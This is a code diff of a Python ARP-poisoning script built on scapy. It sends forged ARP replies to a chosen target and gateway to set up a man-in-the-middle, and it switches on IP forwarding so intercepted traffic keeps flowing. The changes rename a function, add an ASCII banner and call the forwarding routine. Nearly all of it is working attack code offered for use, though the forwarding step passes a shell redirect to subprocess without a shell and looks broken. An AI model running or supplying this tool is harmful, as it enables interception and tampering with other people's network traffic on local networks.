@@ -5,7 +5,7 @@ import subprocess
 import time
 import optparse
 
-def get_user_input():
+def user_input():
     parse_object = optparse.OptionParser()
 
     parse_object.add_option("-t","--target", dest="target_ip", help="Enter Target IP!")
@@ -21,11 +21,8 @@ def get_user_input():
 
     return options
 
-
-
 def ip_forward():
     subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"])
-
 
 def get_mac_address(user_input):
     arp_request = scapy.ARP(pdst=user_input)
@@ -38,16 +35,12 @@ def get_mac_address(user_input):
 
     return answered_list[0][1].hwsrc
 
-
 def arp_poisoning(target_ip, poisoned_ip):
     target_mac = get_mac_address(target_ip)
 
     arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
 
     scapy.send(arp_response, verbose=False)
-
-    # scapy.ls(scapy.ARP())
-
 
 def arp_poisoning_reset(fooled_ip, gateway_ip):
     fooled_mac = get_mac_address(fooled_ip)
@@ -57,9 +50,23 @@ def arp_poisoning_reset(fooled_ip, gateway_ip):
 
     scapy.send(arp_response, verbose=False, count=6)
 
+
+print("""
+by mdo //-
+                                    _                           
+  __ _ _ __ _ __        _ __   ___ (_)___  ___  _ __   ___ _ __ 
+ / _` | '__| '_ \ _____| '_ \ / _ \| / __|/ _ \| '_ \ / _ \ '__| 
+| (_| | |  | |_) |_____| |_) | (_) | \__ \ (_) | | | |  __/ |    
+ \__,_|_|  | .__/      | .__/ \___/|_|___/\___/|_| |_|\___|_|    
+           |_|         |_|                                        
+
+""")
+
+ip_forward()
+
 number = 0
 
-user_ips = get_user_input()
+user_ips = user_input()
 user_target_ip = user_ips.target_ip
 user_gateway_ip = user_ips.gateway_ip
 
